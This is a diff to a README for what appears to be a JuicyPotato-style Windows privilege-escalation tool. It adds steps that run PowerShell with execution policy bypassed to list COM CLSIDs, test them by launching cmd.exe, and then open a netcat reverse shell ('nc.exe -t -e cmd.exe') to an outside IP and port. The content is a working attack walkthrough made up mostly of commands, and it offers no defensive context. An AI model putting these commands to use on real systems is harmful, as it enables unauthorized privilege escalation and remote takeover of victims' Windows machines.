@@ -26,14 +26,53 @@ Optional args:
 ```
 powershell.exe -ExecutionPolicy Bypass -File "C:\Temp\Join-Object.ps1"
 ```
+does not provide direct output. Make sure there are no errors.
+
 ### get list CLSIDs
 ```
 powershell.exe -ExecutionPolicy Bypass -File "C:\Temp\GetCLSID.ps1"
 ```
+Verify following files are generated:<br>
+CLSIDs.csv: List of CLSIDs and APIDs in CSV format.<br>
+CLSID.list: List of CLSIDs only.
+
+
 ### checking CLSIDs
 ```
 .\get.bat
 ```
+result will saved on kaz.log
+
+### or
+
+### Check working CLSID using -c parameter
+```
+method 1
+.\jus.exe -c "{list-xxx-from-xxx-kaz.log}" -t * -l 1337 -z
+
+method 2
+.\jus.exe -c "{list-xxx-from-xxx-kaz.log}" -p "c:\windows\system32\cmd.exe" -a "/c whoami" -l 1337 -t *
+```
+
+### Reverse Shell
+```
+.\jus.exe -l 1337 -c "{working-xxx-xxx-xxx-CLSID}" -p c:\windows\system32\cmd.exe -a "/c C:\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 123.123.123 6969" -t *
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
